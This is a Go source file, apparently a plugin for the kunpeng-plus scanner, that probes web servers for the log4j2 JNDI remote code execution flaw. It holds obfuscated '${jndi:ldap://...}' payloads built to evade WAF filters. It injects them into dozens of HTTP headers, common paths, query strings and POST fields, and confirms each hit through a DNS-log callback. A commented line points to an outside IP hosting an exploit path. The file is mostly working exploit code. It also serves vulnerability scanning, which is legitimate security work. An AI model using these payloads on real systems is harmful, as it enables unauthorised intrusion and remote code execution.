package mypocs

import (
	"fmt"
	plugin "github.com/deenrookie/kunpeng-plus/pocs"
	"github.com/deenrookie/kunpeng-plus/utils"
	util "github.com/deenrookie/kunpeng-plus/utils"
	"net/http"
	"strings"
	"time"
)

type log4jRCE2 struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("log4j", &log4jRCE2{})
}

func (d *log4jRCE2) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "log4j2 RCE DNSLOG",
		Remarks: "log4j 远程命令执行 dnslog验证",
		Level:   0,
		Type:    "RCE",
		Author:  "Deen",
		References: plugin.References{
			URL:  "https://www.anquanke.com/post/id/262670",
			CVE:  "",
			KPID: "KP-1003",
		},
	}
	return d.info
}

func (d *log4jRCE2) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}

func setHeaders(request *http.Request, fullPayload string) {
	request.Header.Set("User-Agent", fullPayload)
	request.Header.Set("X-Forwarded-For", fullPayload)
	request.Header.Set("Client-ip", fullPayload)
	request.Header.Set("Cookie", fullPayload)
	request.Header.Set("Authorization", fullPayload)
	request.Header.Set("X-Forwarded-Ssl", fullPayload)
	request.Header.Set("X-Forwarded-For-Original", fullPayload)
	request.Header.Set("X-Forwarded-Host", fullPayload)
	request.Header.Set("X-Forwarded-Proto", fullPayload)
	request.Header.Set("True-Client-IP", fullPayload)
	request.Header.Set("DNT", fullPayload)
	request.Header.Set("X-CSRFToken", fullPayload)
	request.Header.Set("CSRFToken", fullPayload)
	request.Header.Set("JWT", fullPayload)
	request.Header.Set("X-HTTP-Method-Override", fullPayload)
	request.Header.Set("X-Request-ID", fullPayload)
	request.Header.Set("X-X-ProxyUser-Ip-ID", fullPayload)
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	request.Header.Set("X-Api-Version", fullPayload)
	request.Header.Set("TraceID", fullPayload)
	request.Header.Set("Content-Encoding", fullPayload)
	request.Header.Set("Forwarded", fullPayload)
	request.Header.Set("Sec-WebSocket-Key", fullPayload)
	request.Header.Set("X-Client-Data", fullPayload)
	request.Header.Set("Sec-Ch-Ua", fullPayload)
	request.Header.Set("Sec-Ch-Ua-Mobile", fullPayload)
	request.Header.Set("Sec-Ch-Ua-Platform", fullPayload)
	request.Header.Set("Accept-Language", fullPayload)
	request.Header.Set("Accept", fmt.Sprintf("text/html%s", fullPayload))
}

func (d *log4jRCE2) Check(URL string, meta plugin.TaskMeta) bool {
	domain := util.GetHostFromUrl(URL)

	if domain == "" {
		return false
	}

	_ = meta
	randString := utils.RandStringRunes(3)
	// count := 0
	randStr := domain + ".${:-" + randString + "}"
	//randStr := "xxx.${:-" + randString + "}"
	trueWord := domain + "." + randString
	// randStr = "nowqq" + utils.RandStringRunes(6)
	fmt.Println(randStr)
	payloads := []string{
		//"${j${::-}n${::-}d${::-}i:l${::-}d${::-}a${::-}p://",
		//"${jndi:lda${:-}p://",
		//"${j${aaa::::-n}di:ldap://",
		//"${j${aaa::::-n}d${:-}i:ldap://",
		//"${j${aaa::::-n}d${:-}i:ldap://",
		"${j${:-}n${:-}d${:-}i:l${:-}d${:-}a${:-p:}//",
		"${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://",
		"${jn${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${script:-${:-}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}d}}}}}}}}i}}}}:ldap://",
	}

	reqPaths := []string{
		"/",
		"/admin",
		"/login",
		"/signin",
		"/error",
		"/api",
		"/redirect",
		"/struts2-showcase/token/transfer4.action",
	}

	headers := []string{
		"Origin",
		"Referer",
	}

	methods := []string{
		"GET",
		"POST",
	}

	//client := http.Client{
	//	//Transport: &http.Transport{
	//	//	// 设置代理
	//	//	Proxy: http.ProxyURL(uri),
	//	//},
	//}
	// fmt.Println(randStr)

	timeOutCount := 0
	normalRequestCount := 0
	totalCount := 0

	for _, payload := range payloads {
		var request *http.Request
		fullPayload := fmt.Sprintf("%s%s.%s/}?a", payload, randStr, utils.DNS_LOG_DOMAIN)
		request, _ = http.NewRequest("GET", URL+"/"+fullPayload, nil)
		_, _ = util.RequestDo(request, false)
		//fullPayload = fmt.Sprintf("%s134.175.244.170:1389/exp8/%s}", payload, domain)
		for _, reqPath := range reqPaths {
			for _, method := range methods {

				if method == "POST" {
					postData := fmt.Sprintf("struts.token.name=%spayload=%s&username=%s&password=%s&character_encoding=UTF-8", fullPayload, fullPayload, fullPayload, fullPayload)
					request, _ = http.NewRequest(method, URL+reqPath, strings.NewReader(postData))
				} else {
					request, _ = http.NewRequest(method, URL+reqPath, nil)
				}
				// fmt.Println(count)
				for _, header := range headers {

					if timeOutCount > 2 && normalRequestCount < 3 && totalCount > 5 {
						return false
					}

					request.Header.Set(header, fullPayload)
					setHeaders(request, fullPayload)

					totalCount++
					resp, err := util.RequestDo(request, false)

					// 存在腾讯门神防火墙或者华为防火墙的情况下执行return false
					if &resp != nil && err == nil {
						if resp.Other != nil {
							normalRequestCount++
							if resp.Other.StatusCode == 501 || resp.Other.StatusCode == 418 ||
								strings.Contains(string(resp.Body), "WAF") ||
								strings.Contains(string(resp.Body), "防火墙") {
								return false
							}
						}
					} else if err != nil {
						timeOutCount++
					}

				}

				if utils.IsExistDNSLog(trueWord) {
					result := d.info
					result.Response = "TEST"
					result.Request = "TEST"
					d.result = append(d.result, result)
					return true
				}

				request, _ = http.NewRequest(method, URL+reqPath+"?id="+fullPayload, nil)
				for _, header := range headers {
					if timeOutCount > 2 && normalRequestCount < 3 && totalCount > 5 {
						return false
					}
					request.Header.Set(header, fullPayload)
					setHeaders(request, fullPayload)

					totalCount++
					resp, err := util.RequestDo(request, false)
					if &resp != nil && err == nil {
						normalRequestCount++
						if resp.Other != nil {
							if resp.Other.StatusCode == 501 || resp.Other.StatusCode == 418 ||
								strings.Contains(string(resp.Body), "WAF") ||
								strings.Contains(string(resp.Body), "防火墙") {
								return false
							}
						}
					} else if err != nil {
						timeOutCount++
					}
				}
				//fmt.Println(count)
				//count++
				if utils.IsExistDNSLog(trueWord) {
					result := d.info
					result.Response = "TEST"
					result.Request = "TEST"
					d.result = append(d.result, result)
					return true
				}
			}
		}

	}

	time.Sleep(time.Duration(10) * time.Second)

	if utils.IsExistDNSLog(trueWord) {
		result := d.info
		result.Response = "TEST"
		result.Request = "TEST"
		d.result = append(d.result, result)
		return true
	}
	return false
}
